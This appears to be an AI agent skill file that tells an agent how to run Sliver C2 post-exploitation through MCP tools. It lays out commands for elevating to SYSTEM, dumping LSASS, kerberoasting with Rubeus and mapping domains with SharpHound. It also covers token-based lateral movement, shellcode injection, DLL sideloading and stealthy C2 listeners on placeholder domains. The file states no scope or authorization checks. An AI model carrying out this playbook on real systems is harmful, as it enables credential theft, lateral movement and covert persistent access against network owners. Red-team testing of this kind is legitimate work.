---
name: sliver-c2
description: Use when operating Sliver C2 implants, managing listeners, or performing post-exploitation via sessions or beacons.
---

# Sliver C2 Post-Exploitation

## Sessions vs Beacons

- **Sessions**: Real-time interactive. Use for active enumeration. Higher detection risk.
- **Beacons**: Async callback with interval + jitter. Use for persistence. Lower detection risk.

Our MCP handles both transparently — `interact(implant_id, implant_type="beacon")` resolves async tasks automatically. Read `docs/sliver/tutorials/2---beacons-vs-sessions.md` for details.

## Orientation (do this first)

```
connect()                                                        # or connect(config_file="...")
get_sessions()                                                   # list live sessions
get_beacons()                                                    # list beacons
interact(implant_id="abc-123", implant_type="session")           # set active target
whoami()                                                         # confirm user context
pwd() / ls()                                                     # confirm position
ps()                                                             # survey processes
ifconfig() / netstat()                                           # map network
```

Always `connect()` first, then `interact()` to set the active target before running implant commands.

## Credential Access

**Dump LSASS** (requires SYSTEM or SeDebugPrivilege):
```
get_system()                                       # elevate first
process_dump(pid=<lsass_pid>)                      # dump memory
```
Find LSASS PID with `ps()`, then use offline tools (mimikatz, pypykatz) on the dump.

**In-memory .NET tooling** via execute_assembly:
```
execute_assembly(assembly_path="/local/Rubeus.exe", arguments="kerberoast /format:hashcat")
execute_assembly(assembly_path="/local/SharpHound.exe", arguments="-c All -d domain.local")
```

**BOFs** — see `docs/sliver/reference/bof-and-coff-support.md`. Install via Sliver's armory, execute via Sliver CLI.

## Lateral Movement

**Token manipulation flow**:
1. `make_token(username="admin", password="pass", domain="DOMAIN")` — create token
2. Do lateral work (file access, registry, etc.)
3. `revert_to_self()` — drop the token

**Other options**: `impersonate(username)`, `run_as(username, process_name, args)`, `get_system()`.

**Pivoting/Tunneling** — not available via our MCP tools, use Sliver CLI:
- TCP/named pipe pivots: `docs/sliver/reference/pivots.md`
- Port forwarding: `docs/sliver/reference/port-forwarding.md`
- SOCKS proxy: `docs/sliver/reference/reverse-socks.md`

## Execution

| Method | Notes |
|--------|-------|
| `execute(exe, args)` | Run binary directly, no shell |
| `execute_assembly(path, args)` | In-memory .NET (Rubeus, Seatbelt, etc.) |
| `execute_shellcode(path, pid=)` | Inject raw shellcode, pid=0 for self |
| `sideload(dll_path, entry_point=)` | Load shared library into sacrificial process |

## C2 Transport Selection

Read the full docs at `docs/sliver/c2/`.

| Transport | Speed | Stealth | Notes |
|-----------|-------|---------|-------|
| mTLS | Fast | Moderate | Encrypted + authenticated, unusual traffic |
| HTTPS | Fast | High | Blends with web, supports domain fronting |
| DNS | Slow | Very high | Tunnels through DNS, extremely evasive |
| WireGuard | Fast | Moderate | VPN-based, good for persistent access |

## Listener Management

```
start_mtls_listener(host="0.0.0.0", port=8888)
start_https_listener(host="0.0.0.0", port=443, domain="cdn.example.com")
start_dns_listener(domains=["c2.example.com"], port=53)
get_jobs()                                         # list active listeners
kill_job(job_id=1)                                 # stop a listener
```

## Implant Management

```
get_implant_builds()                               # list stored builds
regenerate_implant(implant_name="windows-mtls")    # regenerate binary
kill_session(session_id="abc-123")                 # terminate session
kill_beacon(beacon_id="def-456")                   # terminate beacon
```

## Sliver Native MCP

Sliver v1.6+ has built-in MCP support (`docs/sliver/reference/mcp.md`). This provides direct access to ALL Sliver commands. If the native MCP is available, prefer it for commands our wrapper doesn't cover (pivots, SOCKS, port forwarding, armory, implant generation).
